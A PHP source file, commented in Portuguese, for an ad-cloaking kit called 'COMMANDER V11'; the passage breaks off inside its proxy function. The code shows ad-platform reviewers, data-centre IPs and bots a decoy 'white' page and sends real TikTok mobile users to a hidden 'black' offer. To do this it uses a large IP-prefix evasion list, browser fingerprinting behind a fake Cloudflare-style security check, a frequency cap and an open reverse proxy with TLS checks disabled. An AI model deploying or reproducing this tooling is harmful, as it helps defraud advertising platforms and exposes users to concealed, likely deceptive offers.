<?php
/**
 * COMMANDER V11 - Cloaking Profissional
 * Campanha: jjj teste 02
 * Gerado em: 2026-05-07 12:29:09
 * 
 * NOTA 10 - Sistema multi-camada para Google, TikTok e Facebook
 * 
 * INSTRUCOES:
 * 1. Faca upload deste arquivo (index.php) para a raiz do seu dominio
 * 2. Faca upload do .htaccess junto
 * 3. Configure a URL do anuncio para: https://seudominio.com/?utm_source=...
 * 
 * OPCIONAL (Deteccao Avancada):
 * - Faca upload do arquivo bot-detection-advanced.js para a raiz tambem
 * - Esse arquivo melhora a deteccao de bots headless, mas NAO E OBRIGATORIO
 */

// ==========================================
// CONFIGURACAO V11 - CLOAKING PROFISSIONAL
// ==========================================
$API_URL = 'https://sys-assets-check.com/COMMANDERV2/api.php';
$CAMPAIGN_SLUG = 'xxxxxxxx';
$WHITE_URL = 'https://armazem11.novacolecao.shop/oficial';
$BLACK_URL = 'https://renovacaobrasil.com/';
$DEBUG_MODE = isset($_GET['debug']) && $_GET['debug'] === '1';

// Plataforma da campanha: 'tiktok', 'google', 'facebook' ou 'other'.
// Definida dinamicamente na criacao da campanha no painel.
$CAMPAIGN_PLATFORM = 'tiktok';

// ==========================================
// FREQUENCY CAP: limite de visualizacoes da oferta (BLACK) por visitante
// ==========================================
// Observacao de trafego: acessos reais saturam em ate 2 visualizacoes do
// BLACK; bots insistem e tentam passar mais vezes. Por isso, a partir da
// 3a tentativa (acima de $FREQ_CAP_MAX) dentro da janela, o visitante e
// enviado para a White Page, sem nem consultar a API.
$FREQ_CAP_ENABLED = true;   // liga/desliga a regra
$FREQ_CAP_MAX     = 2;      // quantas vezes o mesmo visitante pode ver o BLACK
$FREQ_CAP_WINDOW  = 86400;  // janela de contagem, em segundos (86400 = 24h)

// ==========================================
// TRAVA ESTRITA POR PLATAFORMA (PRE-CHECK)
// ==========================================
// Campanhas de TikTok Ads so aceitam visitantes acessando de CELULAR
// e de DENTRO do aplicativo do TikTok. Qualquer acesso via desktop ou
// navegador externo vai DIRETO para a White Page (302), antes de
// qualquer consulta a API. As demais plataformas seguem o fluxo padrao.
if ($CAMPAIGN_PLATFORM === 'tiktok' && !$DEBUG_MODE) {
    $__ttUA = $_SERVER['HTTP_USER_AGENT'] ?? '';

    // 1. Precisa ser dispositivo mobile (Android / iPhone / iPad / iPod)
    $__ttIsMobile = preg_match('/(Android|iPhone|iPad|iPod)/i', $__ttUA);

    // 2. Precisa vir de dentro do app do TikTok / ByteDance
    $__ttIsInApp = preg_match('/(BytedanceWebview|TikTok|Musical_ly|Bytedance|trill|Aweme)/i', $__ttUA);

    // Se NAO for mobile OU NAO vier de dentro do app -> White Page direta
    if (!$__ttIsMobile || !$__ttIsInApp) {
        header('Location: ' . $WHITE_URL, true, 302);
        exit;
    }
}

// ==========================================
// WAF: FIREWALL DE PREFIXOS DE IP
// Bloqueia bots de Data Centers, Cloud Providers e Scrapers
// ANTES de qualquer processamento. Se o IP bater com um prefixo
// da lista, o visitante vai direto para a White Page.
// ==========================================
$_WAF_PREFIXES = [
    // --- ByteDance / TikTok Ads ---
    "103.136.", "43.", "170.106.", "49.51.", "165.154.", "202.47.",
    "103.173.", "103.152.", "103.24.", "101.33.", "101.36.", "101.53.",
    "111.92.", "118.193.", "118.194.", "124.156.", "124.220.", "124.221.",
    "129.204.", "129.226.", "139.155.", "122.161.", "202.181.", "223.233.",
    "39.109.", "113.31.",
    // --- AWS (Amazon Cloud) ---
    "3.", "18.", "34.", "35.", "44.", "52.", "54.", "50.19.", "13.219.", "13.223.", "100.26.",
    // --- Azure (Microsoft Cloud) / Oracle ---
    "20.", "40.", "140.245.", "172.161.",
    // --- Google / Googlebot / Cloudflare WARP ---
    "66.249.", "66.102.", "104.197.", "104.199.", "104.28.",
    // --- DigitalOcean ---
    "134.209.", "138.197.", "159.65.", "159.89.", "161.35.", "165.227.", "167.99.",
    "167.172.", "172.233.", "206.189.", "207.154.",
    // --- Outros Data Centers / Scrapers ---
    "4.184.", "4.185.", "5.9.", "5.83.", "5.133.", "5.161.", "5.182.", "5.224.",
    "8.211.", "8.213.", "8.228.", "8.229.", "8.234.",
    "13.51.", "13.63.", "13.222.",
    "14.18.", "14.192.",
    "15.204.",
    "17.22.", "17.241.", "17.246.",
    "23.19.", "23.80.", "23.111.",
    "27.125.",
    "31.56.",
    "32.193.", "32.194.", "32.195.", "32.197.", "32.198.", "32.199.",
    "36.75.",
    "37.1.", "37.111.", "37.113.",
    "38.110.", "38.154.", "38.250.", "38.253.",
    "39.34.", "39.48.", "39.55.", "39.60.", "39.63.",
    "40.87.",
    "41.56.",
    "42.117.", "42.118.",
    "45.9.", "45.10.", "45.39.", "45.41.", "45.45.", "45.55.", "45.56.",
    "45.61.", "45.74.", "45.88.", "45.92.", "45.94.", "45.138.", "45.148.", "45.153.",
    "45.163.", "45.168.", "45.172.", "45.174.", "45.181.", "45.182.", "45.183.",
    "45.194.", "45.225.", "45.230.", "45.234.", "45.237.",
    "46.17.", "46.174.",
    "47.79.", "47.87.", "47.236.",
    "51.75.",
    "57.128.",
    "58.65.", "58.187.",
    "59.14.", "59.103.",
    "62.197.",
    "64.23.", "64.89.",
    "67.215.", "68.221.",
    "72.1.", "72.153.", "72.255.",
    "74.7.", "74.179.", "74.248.",
    "76.35.",
    "77.74.", "77.78.", "77.83.", "77.90.",
    "78.85.",
    "80.9.", "80.89.", "80.246.",
    "81.56.", "81.196.",
    "82.22.", "82.77.", "82.156.",
    "83.29.",
    "84.32.", "84.55.", "84.233.",
    "85.137.", "85.208.",
    "86.57.",
    "87.58.", "87.99.", "87.205.", "87.222.",
    "88.148.", "88.164.",
    "89.248.",
    "91.73.", "91.92.", "91.98.", "91.134.", "91.148.", "91.207.", "91.211.", "91.224.",
    "92.128.",
    "93.123.", "93.158.",
    "94.47.", "94.154.", "94.247.", "94.254.",
    "95.40.", "95.181.", "95.211.",
    "98.80.", "98.84.", "98.86.", "98.91.", "98.93.",
    "99.79.",
    "100.31.", "100.56.", "100.57.", "100.59.",
    "102.22.",
    "105.77.", "105.188.",
    "106.54.", "106.161.",
    "107.172.", "107.174.",
    "108.", "109.205.",
    "119.252.", "130.12.", "138.199.", "138.201.", "141.148.", "154.36.", "157.143.", "158.158.", "168.144.", "170.246.", "170.254.", "172.105.", "178.156.", "185.92.", "185.225.", "192.210.", "192.255.", "195.70.", "195.178.", "204.101.", "209.54.", "213.188.", "216.194.", "216.251.", "216.73.",
    // --- Bots IPv6 ---
    "2a06:98c0:", "2a03:2880:", "2001:41d0:", "2a04:c300:", "2a09:bac1:", "2001:818:", "2600:3000:", "2404:9dc0:", "2a01:4f9:"
];

$_wafIP = $_SERVER['HTTP_CF_CONNECTING_IP']
       ?? $_SERVER['HTTP_X_FORWARDED_FOR']
       ?? $_SERVER['REMOTE_ADDR']
       ?? '';
// Pega apenas o primeiro IP se vier lista separada por virgula
if (strpos($_wafIP, ',') !== false) {
    $_wafIP = trim(explode(',', $_wafIP)[0]);
}

foreach ($_WAF_PREFIXES as $_prefix) {
    if (strncmp($_wafIP, $_prefix, strlen($_prefix)) === 0) {
        header('Location: ' . $WHITE_URL, true, 302);
        exit;
    }
}
unset($_WAF_PREFIXES, $_wafIP, $_prefix);

// ==========================================
// FASE 0: NAVEGACAO INTERNA DO PROXY
// ==========================================
// CORRECAO V11.1: Verifica _nav e _asset ANTES da deteccao JS
// Quando o proxy reescreve links, as requisicoes subsequentes vem com _nav ou _asset
// Essas requisicoes NAO precisam passar pela deteccao JS novamente
if (isset($_GET['_nav']) || isset($_GET['_asset'])) {
    // E uma requisicao de navegacao interna ou asset do proxy
    // Vai direto para a funcao de proxy
    proxyRequest($WHITE_URL); // A URL real sera determinada dentro da funcao via _nav/_asset
    exit;
}

// ==========================================
// FASE 1: DETECCAO JS (se ainda nao foi feita)
// ==========================================
// Se nao tem os dados de deteccao, mostra pagina de carregamento
// que coleta dados do navegador e reenvia via POST (URL limpa)
if (!isset($_POST['_detected'])) {
    $currentUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') 
                  . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    
    // Pagina de carregamento estilo Cloudflare - simples e confiavel
    echo '<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Aguarde...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;justify-content:center;align-items:center}
.box{background:#fff;border-radius:4px;padding:30px 40px;text-align:center;box-shadow:0 2px 6px rgba(0,0,0,0.1);max-width:340px;width:90%}
.spinner{width:32px;height:32px;border:3px solid #e5e5e5;border-top-color:#f6821f;border-radius:50%;margin:0 auto 16px;animation:spin .8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.title{font-size:15px;color:#333;font-weight:500;margin-bottom:6px}
.sub{font-size:13px;color:#666}
</style>
</head><body>
<div class="box">
<div class="spinner"></div>
<div class="title">Verificando se o site é seguro</div>
<div class="sub">Isso levara apenas alguns segundos...</div>
</div>
<form id="f" method="POST" action="' . htmlspecialchars($currentUrl) . '">
<input type="hidden" name="_detected" value="1">
<input type="hidden" name="webdriver" id="wd">
<input type="hidden" name="plugins_count" id="pc">
<input type="hidden" name="languages" id="lg">
<input type="hidden" name="screen_width" id="sw">
<input type="hidden" name="screen_height" id="sh">
<input type="hidden" name="timezone" id="tz">
<input type="hidden" name="touch_support" id="ts">
<input type="hidden" name="platform" id="pf">
<input type="hidden" name="advanced_bot_score" id="abs">
<input type="hidden" name="advanced_bot_flags" id="abf">
</form>
<script src="/bot-detection-advanced.js" onerror=""></script>
<script>
(function(){
    // Envia formulario imediatamente com dados basicos
    // Deteccao avancada eh OPCIONAL - se arquivo nao existir, continua normalmente
    setTimeout(function(){
        var f=document.getElementById("f");
        f.wd.value=navigator.webdriver||window.navigator.webdriver?"1":"0";
        f.pc.value=navigator.plugins?navigator.plugins.length:0;
        f.lg.value=navigator.languages?navigator.languages.join(","):navigator.language||"";
        f.sw.value=screen.width||0;
        f.sh.value=screen.height||0;
        f.tz.value=Intl.DateTimeFormat().resolvedOptions().timeZone||"";
        f.ts.value=("ontouchstart"in window||navigator.maxTouchPoints>0)?"1":"0";
        f.pf.value=navigator.platform||"";
        
        // Deteccao avancada (se disponivel)
        if(window.advancedBotDetection){
            f.abs.value=window.advancedBotDetection.score||50;
            f.abf.value=window.advancedBotDetection.flags?window.advancedBotDetection.flags.join("|"):"";
        }
        f.submit();
    }, 150); // Pequeno delay para JS carregar
})();
</script>
<noscript><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($WHITE_URL) . '"></noscript>
</body></html>';
    exit;
}

// ==========================================
// FASE 2: PROCESSAMENTO COM DADOS DE DETECCAO
// ==========================================

// Coleta dados do visitante
$visitorIP = getVisitorIP();
$visitorUA = $_SERVER['HTTP_USER_AGENT'] ?? '';
$referer = $_SERVER['HTTP_REFERER'] ?? '';

// =====================================================
// CORRECAO PAIS: Detecta o pais AQUI no tracker.
// O tracker esta atras do Cloudflare e recebe o visitante DIRETAMENTE,
// entao o header CF-IPCountry aqui reflete o pais REAL do visitante.
// A api.php e chamada via cURL (servidor->servidor), entao NAO pode
// detectar o pais sozinha (veria o IP do VPS). Por isso enviamos pronto.
// =====================================================
$visitorCountry = getVisitorCountry();

// UTMs
$utmSource = $_GET['utm_source'] ?? '';
$utmMedium = $_GET['utm_medium'] ?? '';
$utmCampaign = $_GET['utm_campaign'] ?? '';
$utmContent = $_GET['utm_content'] ?? '';
$utmTerm = $_GET['utm_term'] ?? '';

// Dados adicionais de plataformas
$ttclid = $_GET['ttclid'] ?? '';
$gclid = $_GET['gclid'] ?? '';
$fbclid = $_GET['fbclid'] ?? '';

// Dados de deteccao enviados pelo JS via POST
$webdriver = $_POST['webdriver'] ?? '';
$pluginsCount = $_POST['plugins_count'] ?? -1;
$languages = $_POST['languages'] ?? '';
$screenWidth = $_POST['screen_width'] ?? 0;
$screenHeight = $_POST['screen_height'] ?? 0;
$timezone = $_POST['timezone'] ?? '';
$touchSupport = $_POST['touch_support'] ?? '';
$platform = $_POST['platform'] ?? '';

// Dados de deteccao avancada (score de bot headless)
$advancedBotScore = $_POST['advanced_bot_score'] ?? '';
$advancedBotFlags = $_POST['advanced_bot_flags'] ?? '';

// ==========================================
// FREQUENCY CAP (PRE-API): se o visitante ja atingiu o limite de
// visualizacoes do BLACK dentro da janela, forca a White Page AGORA,
// antes de gastar uma consulta a API. Acessos reais nunca chegam aqui
// (saturam em $FREQ_CAP_MAX); quem insiste alem disso e tratado como bot.
// ==========================================
if ($FREQ_CAP_ENABLED) {
    $__freqKey = freqVisitorKey($visitorIP);
    if (freqCountViews($__freqKey, $FREQ_CAP_WINDOW) >= $FREQ_CAP_MAX) {
        header('Location: ' . $WHITE_URL, true, 302);
        exit;
    }
}

// Envia para API com todos os dados de deteccao
$response = checkWithAPI($API_URL, [
    'action' => 'check',
    'campaign' => $CAMPAIGN_SLUG,
    'ip' => $visitorIP,
    'ua' => $visitorUA,
    'referer' => $referer,
    // CORRECAO PAIS: envia o pais ja resolvido pelo tracker (pais REAL do visitante via Cloudflare)
    'country' => $visitorCountry,
    'utm_source' => $utmSource,
    'utm_medium' => $utmMedium,
    'utm_campaign' => $utmCampaign,
    'utm_content' => $utmContent,
    'utm_term' => $utmTerm,
    'ttclid' => $ttclid,
    'gclid' => $gclid,
    'fbclid' => $fbclid,
    // Dados de deteccao basica
    'webdriver' => $webdriver,
    'plugins_count' => $pluginsCount,
    'languages' => $languages,
    'screen_width' => $screenWidth,
    'screen_height' => $screenHeight,
    'timezone' => $timezone,
    'touch_support' => $touchSupport,
    'platform' => $platform,
    // Dados de deteccao AVANCADA (10 tecnicas)
    'advanced_bot_score' => $advancedBotScore,
    'advanced_bot_flags' => $advancedBotFlags
]);

if ($DEBUG_MODE) {
    echo '<pre>DEBUG Response: '; print_r($response); echo '</pre>';
    exit;
}

// Processa resposta
if ($response && isset($response['action'])) {
    
    // Define URL e método de redirecionamento
    // CORRECAO V11.1: Garante que a URL correta seja usada para cada action
    if ($response['action'] === 'black') {
        // FREQUENCY CAP: contabiliza esta visualizacao do BLACK para o
        // visitante. Na proxima vez que ele estourar $FREQ_CAP_MAX, a
        // checagem PRE-API acima ja o desviara para a White Page.
        if ($FREQ_CAP_ENABLED) {
            freqRecordView(freqVisitorKey($visitorIP), $FREQ_CAP_WINDOW);
        }
        // Para BLACK: pega a URL da black page da resposta da API
        // Prioridade: url > redirect > fallback para BLACK_URL local
        $targetUrl = $response['url'] ?? $response['redirect'] ?? $BLACK_URL;
        $method = $response['method'] ?? 'redirect'; // redirect, proxy, meta_refresh, iframe
    } else {
        // Para WHITE: pega a URL da white page da resposta da API
        $targetUrl = $response['url'] ?? $WHITE_URL;
        $method = $response['method'] ?? $response['white_method'] ?? 'redirect';
    }
    
    // DEBUG: descomente para verificar a URL e action
    // error_log("COMMANDER DEBUG - action: " . $response['action'] . " | method: " . $method . " | targetUrl: " . $targetUrl);
    
    // Aplica o metodo de redirecionamento
    switch ($method) {
        case 'proxy':
            // CORRECAO V11.1: Proxy reverso
            // Quando WHITE=proxy e BLACK=proxy, garante que a URL correta seja usada
            // A API sempre retorna a URL correta em 'url' baseado na action
            if (empty($targetUrl)) {
                // Fallback: usa URL local se a resposta nao tiver URL
                $targetUrl = ($response['action'] === 'black') ? $BLACK_URL : $WHITE_URL;
            }
            proxyRequest($targetUrl);
            break;
            
        case 'meta_refresh':
            // Meta refresh - redirecionamento via HTML
            echo '<!DOCTYPE html><html><head>';
            echo '<meta http-equiv=\"refresh\" content=\"0; url=' . htmlspecialchars($targetUrl) . '\">';
            echo '<script>window.location.href=\"' . htmlspecialchars($targetUrl) . '\";</script>';
            echo '</head><body></body></html>';
            exit;
            
        case 'redirect':
        default:
            // Redirect HTTP 302 (padrao)
            header('Location: ' . $targetUrl);
            exit;
    }
    
} else {
    // Erro na API - vai para white page por seguranca
    header('Location: ' . $WHITE_URL);
    exit;
}

// ============================================
// FUNCOES
// ============================================

function getVisitorIP() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ips = explode(',', $_SERVER[$header]);
            $ip = trim($ips[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

// ============================================
// FREQUENCY CAP - FUNCOES AUXILIARES
// ============================================

/**
 * Gera a chave de contagem do visitante.
 * IPv6 troca o sufixo do endereco a cada conexao (privacy extensions),
 * entao contar pelo IP inteiro nao segura o mesmo aparelho. Por isso
 * usamos apenas o prefixo /64 (primeiros 64 bits) no IPv6. IPv4 usa o
 * endereco completo.
 */
function freqVisitorKey($ip) {
    $ip = trim((string)$ip);
    if ($ip === '') {
        return 'v0:unknown';
    }
    // IPv6
    if (strpos($ip, ':') !== false) {
        $packed = @inet_pton($ip);
        if ($packed !== false && strlen($packed) === 16) {
            // Mantem apenas os primeiros 64 bits (8 bytes) = prefixo /64
            return 'v6:' . bin2hex(substr($packed, 0, 8));
        }
        // Fallback textual: primeiros 4 grupos
        $parts = explode(':', $ip);
        return 'v6:' . strtolower(implode(':', array_slice($parts, 0, 4)));
    }
    // IPv4
    return 'v4:' . $ip;
}

/**
 * Caminho do arquivo local que armazena as contagens.
 * Usa o diretorio temporario do sistema para maxima portabilidade
 * (nao depende de permissao de escrita na pasta do site).
 */
function freqStorePath() {
    return rtrim(sys_get_temp_dir(), '/\\') . DIRECTORY_SEPARATOR . 'cmd_freq_cap.json';
}

/**
 * Conta quantas visualizacoes do BLACK o visitante teve dentro da janela.
 * Leitura com lock compartilhado (LOCK_SH).
 */
function freqCountViews($key, $window) {
    $path = freqStorePath();
    if (!is_file($path)) {
        return 0;
    }
    $fp = @fopen($path, 'r');
    if (!$fp) {
        return 0;
    }
    @flock($fp, LOCK_SH);
    $raw = stream_get_contents($fp);
    @flock($fp, LOCK_UN);
    fclose($fp);

    $data = json_decode((string)$raw, true);
    if (!is_array($data) || empty($data[$key]) || !is_array($data[$key])) {
        return 0;
    }
    $now = time();
    $count = 0;
    foreach ($data[$key] as $ts) {
        if (($now - (int)$ts) <= $window) {
            $count++;
        }
    }
    return $count;
}

/**
 * Registra uma visualizacao do BLACK para o visitante.
 * Escrita com lock exclusivo (LOCK_EX) e higienizacao dos timestamps
 * vencidos de todas as chaves (mantem o arquivo pequeno).
 */
function freqRecordView($key, $window) {
    $path = freqStorePath();
    $fp = @fopen($path, 'c+');
    if (!$fp) {
        return;
    }
    if (!@flock($fp, LOCK_EX)) {
        fclose($fp);
        return;
    }
    $raw = stream_get_contents($fp);
    $data = json_decode((string)$raw, true);
    if (!is_array($data)) {
        $data = [];
    }
    $now = time();

    // Adiciona a visualizacao atual
    if (empty($data[$key]) || !is_array($data[$key])) {
        $data[$key] = [];
    }
    $data[$key][] = $now;

    // Higieniza: remove timestamps fora da janela em todas as chaves
    foreach ($data as $k => $arr) {
        if (!is_array($arr)) {
            unset($data[$k]);
            continue;
        }
        $kept = [];
        foreach ($arr as $ts) {
            if (($now - (int)$ts) <= $window) {
                $kept[] = (int)$ts;
            }
        }
        if ($kept) {
            $data[$k] = array_values($kept);
        } else {
            unset($data[$k]);
        }
    }

    // Reescreve o arquivo de forma atomica dentro do lock
    ftruncate($fp, 0);
    rewind($fp);
    fwrite($fp, json_encode($data));
    fflush($fp);
    @flock($fp, LOCK_UN);
    fclose($fp);
}

/**
 * CORRECAO PAIS: Resolve o pais do visitante AQUI no tracker.
 * O tracker fica atras do Cloudflare e recebe o visitante diretamente,
 * entao os headers de geo aqui sao o pais REAL do visitante.
 * Retorna 'XX' quando nao for possivel determinar (a api ignora o filtro nesse caso).
 */
function getVisitorCountry() {
    // METODO 1: Cloudflare (gratis, sem limite, instantaneo)
    if (!empty($_SERVER['HTTP_CF_IPCOUNTRY'])) {
        $country = strtoupper(trim($_SERVER['HTTP_CF_IPCOUNTRY']));
        if (strlen($country) === 2 && $country !== 'XX' && $country !== 'T1') {
            return $country;
        }
    }

    // METODO 2: Vercel
    if (!empty($_SERVER['HTTP_X_VERCEL_IP_COUNTRY'])) {
        $country = strtoupper(trim($_SERVER['HTTP_X_VERCEL_IP_COUNTRY']));
        if (strlen($country) === 2) {
            return $country;
        }
    }

    // METODO 3: outros headers de geo do servidor
    $serverGeoHeaders = [
        'GEOIP_COUNTRY_CODE',
        'HTTP_X_COUNTRY_CODE',
        'HTTP_X_GEO_COUNTRY',
        'HTTP_X_REAL_COUNTRY'
    ];
    foreach ($serverGeoHeaders as $header) {
        if (!empty($_SERVER[$header])) {
            $country = strtoupper(trim($_SERVER[$header]));
            if (strlen($country) === 2 && $country !== 'XX') {
                return $country;
            }
        }
    }

    // Nao foi possivel determinar - a api ignora o filtro de pais nesse caso
    return 'XX';
}

function checkWithAPI($url, $data) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTPHEADER => ['Content-Type: application/x-www-form-urlencoded', 'Accept: application/json']
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

/**
 * Proxy Reverso V5 - COM PROTECAO DE BLACK PAGE
 * - Busca CSS externo e reescreve URLs internas (fontes, @import, url())
 * - Remove integrity/crossorigin que quebram recursos reescritos
 * - Suporta fontes CORS e cache de assets
 * - Intercepta fetch/XHR para requisicoes AJAX
 * - NOVO: Injeta Guardian na black page para detectar bots durante navegacao
 * 
 * @param string $targetUrl URL de destino
 * @param bool $isBlackPage Se true, injeta Guardian para protecao extra
 * @param string $whiteUrl URL da white page para redirecionamento se bot detectado
 */
function proxyRequest($targetUrl, $isBlackPage = false, $whiteUrl = '') {
    // URL atual do proxy (dominio limpo)
    $proxyHost = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
    
    // Suporta navegacao interna via parametro _nav
    // Quando usuario clica em links dentro da pagina proxeada
    if (isset($_GET['_nav']) && !empty($_GET['_nav'])) {
        $targetUrl = base64_decode($_GET['_nav']);
    }
    
    // ===========================================
    // BUSCA ASSETS (CSS, JS, FONTES, IMAGENS)
    // ===========================================
    if (isset($_GET['_asset']) && !empty($_GET['_asset'])) {
        $assetUrl = base64_decode($_GET['_asset']);
        
        $ch = curl_init($assetUrl);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0',
            CURLOPT_HTTPHEADER => [
                'Accept: */*',
                'Accept-Language: pt-BR,pt;q=0.9,en;q=0.8'
            ]
        ]);
        
        $assetContent = curl_exec($ch);
        $assetHttpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $assetContentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE) ?: 'application/octet-stream';
        curl_close($ch);
        
        if ($assetContent === false) {
            header('HTTP/1.1 502 Bad Gateway');
            exit;
        }
        
        // Se for CSS, reescreve URLs internas
        if (stripos($assetContentType, 'text/css') !== false || preg_match('/\.css(\?|$)/i', $assetUrl)) {
            $assetParsed = parse_url($assetUrl);
            $assetBaseUrl = $assetParsed['scheme'] . '://' . $assetParsed['host'];
            $assetBasePath = isset($assetParsed['path']) ? dirname($assetParsed['path']) : '';
            if ($assetBasePath === '/' || $assetBasePath === '.' || $assetBasePath === '\\') $assetBasePath = '';
            
            // Reescreve url() dentro do CSS
            $assetContent = preg_replace_callback(
                '/url\s*\(\s*[\"\']?([^\"\'\)]+)[\"\']?\s*\)/i',
                function($m) use ($assetBaseUrl, $assetBasePath, $proxyHost) {
                    $url = trim($m[1]);
                    if (preg_match('/^(data:|#)/i', $url)) return $m[0];
                    // Converte para absoluta
                    if (preg_match('/^https?:\/\//i', $url)) {
                        $absolute = $url;
                    } elseif (strpos($url, '//') === 0) {
                        $absolute = 'https:' . $url;
                    } elseif (strpos($url, '/') === 0) {
                        $absolute = $assetBaseUrl . $url;
                    } else {
                        $absolute = $assetBaseUrl . $assetBasePath . '/' . $url;
                    }
                    // Passa pelo proxy para fontes e imagens
                    return 'url("' . $proxyHost . '/?_asset=' . base64_encode($absolute) . '")';
                },
                $assetContent
            );
            
            // Reescreve @import
            $assetContent = preg_replace_callback(
                '/@import\s+[\"\']([^\"\']+)[\"\'];?/i',
                function($m) use ($assetBaseUrl, $assetBasePath, $proxyHost) {
                    $url = trim($m[1]);
                    if (preg_match('/^https?:\/\//i', $url)) {
                        $absolute = $url;
                    } elseif (strpos($url, '//') === 0) {
                        $absolute = 'https:' . $url;
                    } elseif (strpos($url, '/') === 0) {
                        $absolute = $assetBaseUrl . $url;
                    } else {
                        $absolute = $assetBaseUrl . $assetBasePath . '/' . $url;
                    }
                    return '@import "' . $proxyHost . '/?_asset=' . base64_encode($absolute) . '";';
                },
                $assetContent
            );
            
            $assetContentType = 'text/css; charset=UTF-8';
        }
        
        // Headers
        header('HTTP/1.1 ' . $assetHttpCode);
        header('Content-Type: ' . $assetContentType);
        header('Cache-Control: public, max-age=86400');
        header('Access-Control-Allow-Origin: *');
        
        echo $assetContent;
        exit;
    }
    
    // ===========================================
    // BUSCA PAGINA HTML PRINCIPAL
    // ===========================================
    // CORRECAO V11.2: Verifica se o POST e da navegacao interna (formulario na pagina proxeada)
    // ou se e da fase de deteccao JS. No segundo caso, devemos fazer GET para nao enviar dados errados.
    // 
    // O POST da deteccao JS contem: _detected=1, webdriver=0, plugins_count=X, etc.
    // Esses dados NAO devem ser enviados para a BLACK page!
    //
    // Identificamos POST de deteccao se:
    // 1. Nao tem _nav na URL (navegacao interna sempre usa _nav)
    // 2. Tem _detected no POST
    $isNavigationPost = isset($_GET['_nav']) && $_SERVER['REQUEST_METHOD'] === 'POST';
    $isDetectionPost = isset($_POST['_detected']);
    
    // So faz POST real se for navegacao interna (formulario na black page), nao deteccao
    $isPost = $isNavigationPost && !$isDetectionPost;
    $postData = $isPost ? file_get_contents('php://input') : null;
    
    $ch = curl_init($targetUrl);
    $curlOpts = [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0',
        CURLOPT_HTTPHEADER => [
            'X-Forwarded-For: ' . getVisitorIP(),
            'X-Forwarded-Proto: https',
            'Referer: ' . $targetUrl,
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: pt-BR,pt;q=0.9,en;q=0.8'
        ]
    ];
    
    if ($isPost) {
        $curlOpts[CURLOPT_POST] = true;
        $curlOpts[CURLOPT_POSTFIELDS] = $postData;
        $curlOpts[CURLOPT_HTTPHEADER][] = 'Content-Type: ' . ($_SERVER['CONTENT_TYPE'] ?? 'application/x-www-form-urlencoded');
    }
    
    curl_setopt_array($ch, $curlOpts);
    
    $response = curl_exec($ch);
    $finalUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
    curl_close($ch);
    
    if ($response === false) {
        header('HTTP/1.1 503 Service Unavailable');
        echo 'Erro ao conectar ao servidor remoto';
        exit;
    }
    
    // Se nao for HTML, retorna diretamente
    if (stripos($contentType, 'text/html') === false && stripos($contentType, 'application/xhtml') === false) {
        header('HTTP/1.1 ' . $httpCode);
        header('Content-Type: ' . $contentType);
        header('Cache-Control: public, max-age=86400');
        echo $response;
        exit;
    }
    
    // Extrai base URL do destino
    $parsed = parse_url($finalUrl);
    $baseUrl = $parsed['scheme'] . '://' . $parsed['host'];
    $basePath = isset($parsed['path']) ? dirname($parsed['path']) : '';
    if ($basePath === '/' || $basePath === '\\' || $basePath === '.') {
        $basePath = '';
    }
    
    // Funcao para converter URL relativa em absoluta
    $makeAbsolute = function($url) use ($baseUrl, $basePath) {
        $url = trim($url);
        if (preg_match('/^https?:\/\//i', $url)) return $url;
        if (preg_match('/^(data:|javascript:|mailto:|tel:|#)/i', $url)) return $url;
        if (strpos($url, '//') === 0) return 'https:' . $url;
        if (strpos($url, '/') === 0) return $baseUrl . $url;
        return $baseUrl . $basePath . '/' . $url;
    };
    
    // Funcao para criar link do proxy (URL limpa)
    $makeProxyLink = function($url) use ($proxyHost, $makeAbsolute) {
        $url = trim($url);
        if (preg_match('/^(javascript:|mailto:|tel:|#|data:)/i', $url)) {
            return $url;
        }
        $absolute = $makeAbsolute($url);
        return $proxyHost . '/?_nav=' . base64_encode($absolute);
    };
    
    // Funcao para criar URL de asset via proxy
    $makeAssetProxy = function($url) use ($proxyHost, $makeAbsolute) {
